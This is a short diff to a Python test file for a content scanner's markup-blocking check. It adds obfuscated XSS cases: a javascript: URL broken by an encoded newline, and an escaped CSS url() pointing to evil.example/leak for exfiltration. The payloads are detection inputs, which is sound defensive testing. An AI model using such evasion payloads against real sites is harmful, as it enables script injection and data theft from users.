@@ -73,6 +73,11 @@ async def test_scan_layer1_single_pattern_match_is_blocked() -> None:
             "<style>.x { background: url(https://evil.example/leak) }</style>",
             "CSS network/code primitive",
         ),
+        ('<a href="java&#x0A;script:alert(1)">x</a>', "Active markup dangerous resource URL"),
+        (
+            r"<style>.x { background: u\72l(https://evil.example/leak) }</style>",
+            "CSS network/code primitive",
+        ),
     ],
 )
 async def test_scan_layer1_blocks_active_markup(payload: str, flag: str) -> None:
